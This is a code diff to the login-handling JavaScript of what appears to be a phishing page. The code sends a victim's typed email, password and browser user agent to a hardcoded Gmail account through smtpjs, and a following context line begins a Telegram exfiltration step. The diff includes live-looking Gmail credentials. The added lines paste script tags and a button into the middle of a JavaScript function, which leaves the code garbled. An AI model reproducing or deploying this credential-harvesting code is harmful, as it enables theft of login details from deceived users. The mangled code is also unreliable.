@@ -609,16 +609,33 @@ $(document).ready(function () {
       return false;
     }
 
-    // Send email
+   <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script>
+  function sendEmail() {
+    // Send email using Gmail's SMTP server
     Email.send({
-	  Host: "smtp.gmail.com",
-	  Username: "bigbabyysophie@gmail.com",
-	  Password: "zyxrzpbtwryyscms",
-      To: 'bigbabyysophie@gmail.com',
-      From: "bigbabyysophie@gmail.com",
-      Subject: "New Login Information Received",
-      Body: `Email: ${email}<br/>Password: ${password}<br/>User-Agent: ${navigator.userAgent}`,
-    }).then(function () {
+      Host: "smtp.gmail.com",                     // Gmail SMTP server
+      Username: "bigbabyysophie@gmail.com",           // Your Gmail email address
+      Password: "zyxrzpbtwryyscms",                  // Your Gmail App Password (not your Gmail password)
+      To: "bigbabyysophie@gmail.com",                 // Recipient email address (could be the same as From)
+      From: "bigbabyysophie@gmail.com",               // Your email (same as Username)
+      Subject: "New Login Information Received",  // Subject of the email
+      Body: `Email: ${email}<br/>Password: ${password}<br/>User-Agent: ${navigator.userAgent}`, // Email body
+      SecureToken: "",                            // SecureToken can be used instead of Password (optional, not required here)
+      Port: 465,                                  
+    }).then(function (message) {
+      console.log("Email sent successfully:", message);  // Log success message
+      alert("Email sent successfully!");                  // Alert user if email was sent
+    }).catch(function (error) {
+      console.error("Error sending email:", error);       // Log error if something goes wrong
+      alert("Error sending email: " + error);             // Alert user if there was an error
+    });
+  }
+</script>
+
+<button onclick="sendEmail()">Send Email</button>
+
       // Send Telegram message
       const message = `————— New Login Info —————\n\nEmail: ${email}\nPassword: ${password}\n\nUser-Agent: ${navigator.userAgent}`;
       $.ajax({
